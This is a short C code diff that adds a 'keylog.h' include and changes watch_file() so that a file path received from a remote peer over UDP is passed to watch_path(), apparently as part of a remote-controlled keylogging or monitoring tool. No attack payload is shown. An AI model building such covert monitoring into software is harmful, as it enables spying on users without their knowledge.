@@ -1,4 +1,5 @@
 #include "menu_options.h"
+#include "keylog.h"
 #include "udp.h"
 #include <arpa/inet.h>
 #include <errno.h>
@@ -426,29 +427,13 @@ int get_file(struct ip_info ip_ctx)
 
 int watch_file(struct ip_info ip_ctx)
 {
-    char path[1024];
+    char *result = NULL;
 
-    if (send_string(ip_ctx, "8.") != 0)
+    if (receive_string(ip_ctx, &result) != 0)
         return -1;
 
-    printf("Enter file path to watch: ");
-    fflush(stdout);
+    watch_path(result);
 
-    if (!fgets(path, sizeof(path), stdin))
-        return -1;
-
-    path[strcspn(path, "\n")] = '\0';
-
-    if (path[0] == '\0')
-    {
-        printf("No file specified.\n");
-        return -1;
-    }
-
-    if (send_string(ip_ctx, path) != 0)
-        return -1;
-
-    printf("File %s requested to watch.\n", path);
     return 0;
 }
 
